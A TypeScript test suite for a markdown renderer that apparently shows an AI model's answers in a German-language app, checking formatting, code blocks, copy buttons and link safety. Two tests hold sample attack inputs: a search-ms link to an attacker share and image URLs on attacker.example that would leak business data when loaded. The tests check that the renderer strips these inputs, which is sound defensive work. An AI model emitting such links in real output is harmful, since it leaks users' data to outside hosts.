import {copiedCode, renderMarkdown} from "./markdown.util";

describe("renderMarkdown", () => {
    const copyLabels = {copy: "Copy", title: "Copy code"};
    const render = (text: string) => renderMarkdown(text, copyLabels);

    it("renders headings, emphasis and lists", () => {
        const html = render("## Lieferung\n\n**Ab 15 Uhr**\n\n- Abholung\n- Versand");
        expect(html).toContain("<h2>Lieferung</h2>");
        expect(html).toContain("<strong>Ab 15 Uhr</strong>");
        expect(html).toContain("<ul>\n<li>Abholung</li>\n<li>Versand</li>\n</ul>");
    });

    it("renders GFM tables and keeps single line breaks", () => {
        const html = render("| Artikel | Preis |\n|---|---|\n| Filter | 120 € |");
        expect(html).toContain("<table>");
        expect(html).toContain("<td>Filter</td>");
        expect(render("Zeile 1\nZeile 2")).toContain("Zeile 1<br>Zeile 2");
    });

    it("renders code blocks and inline code", () => {
        const html = render("`a` und\n\n```\nb = 1\n```");
        expect(html).toContain("<code>a</code>");
        expect(html).toContain("<pre><code>b = 1</code></pre>");
    });

    it("highlights a code block in its language and labels it", () => {
        const html = render("```groovy title=Spec.groovy\ndef x = 'a'\n```");
        expect(html).toContain('<span class="code-lang">Groovy</span>');
        expect(html).toContain('<code class="hljs language-groovy">');
        expect(html).toContain('<span class="hljs-keyword">def</span>');
    });

    it.each([
        ["```\nb = 1\n```", "Code"],
        ["```brainfuck\n+-\n```", "brainfuck"],
        ["```<b>x</b>\n<i>1</i>\n```", "&lt;b&gt;x&lt;/b&gt;"],
    ])("labels a block without a known language - %s as %s - and escapes it", (text, label) => {
        const html = render(text);
        expect(html).toContain(`<span class="code-lang">${label}</span>`);
        expect(html).not.toContain("hljs");
        expect(html).not.toMatch(/<(b|i)>/);
    });

    it("finds the code of the block whose copy control was clicked", () => {
        const answer = document.createElement("div");
        answer.innerHTML = render("Text\n\n```ts\nconst a = 1 < 2;\n```");

        expect(copiedCode(answer.querySelector(".code-copy"))).toBe("const a = 1 < 2;");
        expect(copiedCode(answer.querySelector("p"))).toBeNull();
        expect(copiedCode(null)).toBeNull();
    });

    it("labels the copy control with the texts it is given, escaped", () => {
        const html = renderMarkdown("```\nb = 1\n```", {copy: "<b>Kopieren</b>", title: 'Code "kopieren"'});

        expect(html).toContain(
            '<span class="code-copy" role="button" tabindex="0" title="Code &quot;kopieren&quot;">&lt;b&gt;Kopieren&lt;/b&gt;</span>',
        );
    });

    it("opens links in a new tab", () => {
        expect(render("[Website](https://example.com)")).toContain(
            '<a target="_blank" rel="noopener noreferrer" href="https://example.com">Website</a>',
        );
    });
    it("keeps a link that is no web or mail link as its text", () => {
        const html = render("[Datei herunterladen](sandbox:/a.docx) und [**hier**](/relativ)");

        expect(html).not.toContain("<a");
        expect(html).toContain("Datei herunterladen");
        expect(html).toContain("<strong>hier</strong>");
    });

    it("keeps a raw HTML link that is no web or mail link as its text - it could open a program of the computer", () => {
        const html = render(
            '<a href="search-ms:query=x&crumb=location:\\\\attacker\\share">Rechnung <b>öffnen</b></a> und ' +
                '<a href="https://example.com">Website</a>',
        );

        expect(html).not.toContain("search-ms");
        expect(html).toContain("Rechnung <b>öffnen</b>");
        expect(html).toContain('<a href="https://example.com">Website</a>');
    });

    it("loads nothing by itself - an image address could carry the company's data out; an image keeps its alt text", () => {
        const html = render(
            "![Logo](https://attacker.example/?d=Umsatz)\n\n" +
                '<img src="https://attacker.example/a.png"> <video poster="https://attacker.example/p.png"></video>\n\n' +
                '<table background="https://attacker.example/t.png"><tr><td>Zelle</td></tr></table>',
        );

        expect(html).not.toContain("attacker.example");
        expect(html).not.toMatch(/<(img|video)/);
        expect(html).toContain("Logo");
        expect(html).toContain("Zelle");
    });

    it("never throws on a model's runaway answer - a table padded with blanks", () => {
        const runaway = "| Abschnitt | Inhalt" + " ".repeat(366_000);
        expect(() => render(runaway)).not.toThrow();
        expect(render(runaway)).toContain("Abschnitt");
    });
});
